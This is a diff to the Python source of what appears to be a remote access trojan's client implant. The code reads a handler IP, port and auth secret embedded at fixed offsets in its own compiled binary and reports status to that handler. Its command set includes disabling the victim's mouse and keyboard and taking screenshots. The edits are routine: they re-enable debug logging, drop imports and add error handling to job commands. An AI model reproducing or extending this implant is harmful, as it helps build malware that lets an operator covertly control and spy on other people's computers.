@@ -9,14 +9,8 @@ from core.common import *
 from core.communication import Transport
 
 import sys
-import socket
 import logging
-import Queue
 import time
-import zlib
-import base64
-import hashlib
-import threading
 	
 if sys.stdout.isatty():
 	logging.basicConfig(level=logging.DEBUG, format="%(asctime)s %(levelname)s in %(funcName)s: %(message)s")
@@ -25,7 +19,7 @@ else:
 
 try:
 	print sys.frozen
-	#logging.debug("Looks like we're compiled. Let's read encoded data...")
+	logging.debug("Looks like we're compiled. Let's read encoded data...")
 	with open(sys.argv[0], "rb") as f:
 		f.seek(972)
 		HANDLER_IP = ""
@@ -39,13 +33,13 @@ try:
 		f.seek(930)
 		AUTH_SECRET = f.read(30)
 except Exception as e:
-	#logging.debug("We're uncompyled, let's use these values...")
+	logging.debug("We're uncompyled, let's use these values...")
 	HANDLER_IP = "127.0.0.1"
 	HANDLER_PORT = 8080
 	with open("stelf.guid", "rb") as f:
 		AUTH_SECRET = f.read()
 		
-#logging.debug("Handler is at "+str(HANDLER_IP)+":"+str(HANDLER_PORT)+", auth key is "+AUTH_SECRET)
+logging.debug("Handler is at "+str(HANDLER_IP)+":"+str(HANDLER_PORT)+", auth key is "+AUTH_SECRET)
 	
 def status(stat):
 	shell.transport.user_channel.signal("STATUS:"+stat)
@@ -201,7 +195,7 @@ help - This menu!
 			except:
 				return self.error, "[*]Usage: uictl [disable|enable] [mouse|keyboard]"
 			else:
-				return info.uictl, action, what
+				return info.uictl, action+" "+what
 				
 		elif data == "screenshot":
 			return info.take_screenshot
@@ -239,15 +233,21 @@ help - This menu!
 				elif data[1] == "print":
 					if len(data) < 3: output = "[-]Which job?"
 					else:
-						which = int(data[2])
-						output = self.jobs[which].output
+						try:
+							which = int(data[2])
+							output = self.jobs[which].output
+						except:
+							output = "[-]"+str(which)+" is not a valid job ID."
 					
 				elif data[1] == "stop" or data[1] == "rm":
 					if len(data) < 3: output = "[-]Which job?"
 					else:
-						which = int(data[2])
-						del self.jobs[which]
-						output = "[+]Job removed."
+						try:
+							which = int(data[2])
+							del self.jobs[which]
+							output = "[+]Job removed."
+						except:
+							output = "[-]"+str(which)+" is not a valid job ID."
 					
 				else:
 					output = "[-]No such option: "+data[1]
@@ -282,7 +282,4 @@ while True:
 			try: t.stop() # RED LIGHT
 			except: pass
 		time.sleep(5)
-			
-if __name__ == "__main__":
-	main()
 	
